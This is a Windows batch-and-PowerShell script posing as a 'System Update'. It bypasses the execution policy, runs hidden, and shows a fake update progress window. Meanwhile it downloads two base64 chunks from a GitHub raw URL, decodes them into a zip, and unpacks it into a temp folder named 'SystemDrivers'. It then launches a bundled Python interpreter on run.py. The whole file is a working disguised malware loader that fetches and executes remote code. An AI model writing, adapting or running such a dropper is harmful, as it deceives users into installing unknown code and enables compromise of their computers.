@echo off
setlocal
set "ps1path=%temp%\sys_update_%random%.ps1"
more +6 "%~f0" > "%ps1path%"
start "" /B powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%ps1path%"
exit /b
$ErrorActionPreference = 'Stop'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Install to a fixed, reliable path that always works
$installRoot = Join-Path $env:TEMP 'SystemDrivers'
New-Item -Path $installRoot -ItemType Directory -Force | Out-Null

$form = New-Object System.Windows.Forms.Form
$form.Text = "System Update"
$form.Size = New-Object System.Drawing.Size(420, 160)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedDialog'
$form.ControlBox = $false
$form.TopMost = $true
$form.ShowInTaskbar = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)

$lbl = New-Object System.Windows.Forms.Label
$lbl.Location = New-Object System.Drawing.Point(20, 18)
$lbl.Size = New-Object System.Drawing.Size(370, 50)
$lbl.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$lbl.ForeColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$lbl.Text = "Initializing..."
$form.Controls.Add($lbl)

$pb = New-Object System.Windows.Forms.ProgressBar
$pb.Location = New-Object System.Drawing.Point(20, 80)
$pb.Size = New-Object System.Drawing.Size(370, 18)
$pb.Style = 'Marquee'
$pb.MarqueeAnimationSpeed = 25
$form.Controls.Add($pb)

$form.Show()
$form.Refresh()

$sync = [hashtable]::Synchronized(@{})
$sync.Status  = "Preparing setup files...`nThis might take a few moments."
$sync.Done    = $false
$sync.Error   = $null
$sync.zipUrl  = 'https://raw.githubusercontent.com/locnguyenn12/lnk/refs/heads/main/macOSx.zip'
$sync.dest    = Join-Path $installRoot 'macOSx'
$sync.root    = $installRoot

$rs = [runspacefactory]::CreateRunspace()
$rs.Open()

$ps = [PowerShell]::Create().AddScript({
    param($sync)
    $ErrorActionPreference = 'Stop'
    try {
        try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

        $sync.Status = "Downloading required components...`nPlease wait."
        
        $part1Url = 'https://raw.githubusercontent.com/locnguyenn12/lnk/refs/heads/main/macOSx.zip.b64.part1'
        $part2Url = 'https://raw.githubusercontent.com/locnguyenn12/lnk/refs/heads/main/macOSx.zip.b64.part2'
        
        $part1Path = Join-Path $env:TEMP ('macOSx_part1_{0}.b64' -f [Guid]::NewGuid().ToString('N'))
        $part2Path = Join-Path $env:TEMP ('macOSx_part2_{0}.b64' -f [Guid]::NewGuid().ToString('N'))
        
        Invoke-WebRequest -Uri $part1Url -OutFile $part1Path -UseBasicParsing
        Invoke-WebRequest -Uri $part2Url -OutFile $part2Path -UseBasicParsing
        
        $sync.Status = "Assembling components...`nAlmost done."
        $zipPath = Join-Path $env:TEMP ('macOSx_{0}.zip' -f [Guid]::NewGuid().ToString('N'))
        
        $b64 = (Get-Content $part1Path -Raw) + (Get-Content $part2Path -Raw)
        $bytes = [System.Convert]::FromBase64String($b64.Replace("`r","").Replace("`n",""))
        [System.IO.File]::WriteAllBytes($zipPath, $bytes)
        
        Remove-Item -LiteralPath $part1Path -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $part2Path -Force -ErrorAction SilentlyContinue

        if (Test-Path -LiteralPath $sync.dest) {
            $sync.Status = "Removing temporary files..."
            Remove-Item -LiteralPath $sync.dest -Recurse -Force
        }

        $sync.Status = "Installing features...`nAlmost done."
        Expand-Archive -LiteralPath $zipPath -DestinationPath $sync.root -Force
        Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue

        $sync.Status = "Setup complete!`nStarting application..."
    } catch {
        $sync.Error = $_.Exception.Message
    } finally {
        $sync.Done = $true
    }
}).AddArgument($sync)

$ps.Runspace = $rs
$handle = $ps.BeginInvoke()

while (-not $sync.Done) {
    if ($lbl.Text -ne $sync.Status) { $lbl.Text = $sync.Status }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 50
}

if ($sync.Error) {
    $pb.Style = 'Blocks'; $pb.Value = 100
    $lbl.Text = "Error: " + $sync.Error
    $lbl.ForeColor = [System.Drawing.Color]::Red
    $form.Refresh()
    Start-Sleep -Seconds 5
} else {
    $lbl.Text = $sync.Status
    $pb.Style = 'Blocks'; $pb.Value = 100
    $form.Refresh()
    Start-Sleep -Seconds 1

    $pyExe    = Join-Path $sync.dest 'python.exe'
    $pyScript = Join-Path $sync.dest 'run.py'
    if ((Test-Path $pyExe) -and (Test-Path $pyScript)) {
        Start-Process -FilePath $pyExe -ArgumentList "`"$pyScript`"" -WorkingDirectory $sync.dest -WindowStyle Normal
    }
}

$form.Close()
$ps.Dispose()
$rs.Close()
$rs.Dispose()
